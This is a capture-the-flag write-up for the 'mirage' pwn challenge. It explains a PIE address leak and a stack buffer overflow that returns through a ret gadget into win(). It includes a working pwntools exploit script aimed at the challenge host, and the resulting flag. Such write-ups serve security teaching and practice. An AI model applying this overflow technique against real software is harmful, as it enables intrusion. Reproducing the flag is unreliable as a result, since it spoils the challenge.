---
title: "PWN01 (mirage)"
ctf: "CSCV2026 (inferred from the target flag prefix)"
date: 2026-10-16
category: pwn
difficulty: medium (estimated)
points: null
flag_format: "CSCV2026{...}"
author: "OpenCode-assisted"
---

# PWN01 (mirage)

## Summary

The service leaks the PIE address of `main`, then reads 256 bytes into a stack buffer whose saved return address is 0x58 bytes from the input start. Use the leak to return through an alignment `ret` gadget into `win()`, which prints `flag`.

## The two ideas behind the solve

### PIE and the leaked address

Position-independent executables (PIE) are loaded at a different base address each time. This makes hard-coded code addresses unreliable. The binary still has fixed offsets inside the executable, though. If `main` is at offset `0x12fc` and the service leaks its real address, subtracting the offset gives the load base. Adding another offset then gives the runtime address of `win()`.

### Why the extra `ret` matters

The saved return address is reached after `0x58` bytes. The first address in the payload is a plain `ret` gadget, followed by `win()`. That extra return adjusts the stack by eight bytes before `win()` starts. On x86-64 this keeps the stack aligned for the function call; without it, the final jump can fail even though the addresses are correct.

## Solution

### Leak PIE and redirect control flow

`main` is at image offset `0x12fc`, `win` at `0x1422`, and a plain `ret` gadget at `0x101a`. Subtracting the `main` offset from the leaked address recovers the PIE base. The payload uses 0x58 bytes of padding, then the `ret` gadget and `win`.

Save the following as `solve.py` beside `PWN01.zip`. It accepts the target host and port, uses TLS, and prints the flag returned by the service:

```python
#!/usr/bin/env python3
import re
import zipfile
from pwn import context, log, p64, remote

context.arch = "amd64"
context.log_level = "info"
HOST = "pwn01-4ce22429cd13.59.153.245.188.sslip.io"
PORT = 1337
MAIN, WIN, RET = 0x12FC, 0x1422, 0x101A

# Confirm the expected executable is present in the supplied challenge archive.
with zipfile.ZipFile("PWN01.zip") as archive:
    assert "PWN01/mirage" in archive.namelist()

io = remote(HOST, PORT, ssl=True)
banner = io.recvuntil(b"input:\n")
match = re.search(rb"main@(0x[0-9a-fA-F]+)", banner)
if not match:
    raise SystemExit(f"target did not leak main: {banner!r}")

base = int(match.group(1), 16) - MAIN
log.info("PIE base: %#x", base)
io.send(b"A" * 0x58 + p64(base + RET) + p64(base + WIN))
output = io.recvall(timeout=3)
print(output.decode("utf-8", errors="replace"), end="")
flag = re.search(rb"CSCV2026\{[^}\r\n]+\}", output)
if not flag:
    raise SystemExit("target response did not contain a CSCV2026 flag")
print("Flag:", flag.group().decode())
```

Verified target output:

```text
[win] verified path:
CSCV2026{Mea5uR3_7h3_Cl3aN_rUn_no7_gDB}
```

## Flag

```text
CSCV2026{Mea5uR3_7h3_Cl3aN_rUn_no7_gDB}
```
